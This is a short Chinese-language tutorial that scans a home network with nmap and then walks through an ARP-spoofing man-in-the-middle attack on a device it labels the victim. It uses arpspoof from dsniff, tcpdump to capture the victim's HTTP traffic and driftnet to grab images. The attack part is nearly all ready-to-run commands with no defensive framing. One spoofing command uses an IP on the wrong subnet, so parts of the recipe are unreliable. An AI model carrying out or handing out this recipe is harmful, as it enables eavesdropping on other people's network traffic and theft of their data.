> nmap -sS 192.168.0.1/24

```text
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 02:59 CST
Nmap scan report for 192.168.0.1
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
1900/tcp open  upnp
MAC Address: 78:44:FD:77:53:EF (Tp-link Technologies)

Nmap scan report for 192.168.0.100
Host is up (0.0040s latency).
All 1000 scanned ports on 192.168.0.100 are filtered
MAC Address: 9C:A6:15:5C:37:D2 (Tp-link Technologies)

Nmap scan report for 192.168.0.101
Host is up (0.0039s latency).
All 1000 scanned ports on 192.168.0.101 are filtered
MAC Address: 28:2C:B2:C1:70:C1 (Tp-link Technologies)

Nmap scan report for 192.168.0.102
Host is up (0.14s latency).
Not shown: 999 filtered ports
PORT     STATE  SERVICE
6881/tcp closed bittorrent-tracker
MAC Address: 60:3A:7C:11:07:38 (Tp-link Technologies)

Nmap scan report for 192.168.0.103
Host is up (0.012s latency).
Not shown: 999 closed ports
PORT      STATE SERVICE
16080/tcp open  osxwebadmin
MAC Address: A4:50:46:6C:CE:65 (Xiaomi Communications)

Nmap scan report for 192.168.0.105
Host is up (0.22s latency).
Not shown: 999 closed ports
PORT      STATE SERVICE
62078/tcp open  iphone-sync
MAC Address: 54:99:63:33:AB:B5 (Apple)

Nmap scan report for 192.168.0.109
Host is up (0.00026s latency).
Not shown: 999 filtered ports
PORT    STATE SERVICE
135/tcp open  msrpc
MAC Address: 28:3A:4D:74:FA:41 (Cloud Network Technology (Samoa) Limited)

Nmap scan report for 192.168.0.128
Host is up (0.0000020s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (8 hosts up) scanned in 102.69 seconds
```


注意：运行 arpspoof 命令时提示：arpspoof未找到命令，其原因是你还未安装 arpspoof 工具；arpspoof 是 dsniff 的一个附属工具，所以我们需要安装的是 dsniff

打开一个控制台
> apt-get install dsniff
> arpspoof -i eth0 -t 192.168.0.103(受害者ip) 192.168.0.1(路由器ip)     告诉192.168.0.103(受害者ip)，我是路由器

我们再打开一个控制台：
> arpspoof -i eth0 -t 192.168.0.1(路由器ip) 192.168.1.101(我的ip)      告诉路由器，我的ip是(受害者)

我们再打开一个控制台：
> tcpdump tcp -nnAi eth0 port 80 and host 192.168.0.103(受害者ip)

安装图形捕获工具driftnet
> apt-get install driftnet   安装 
> driftnet -i eth0    获取0号网卡   



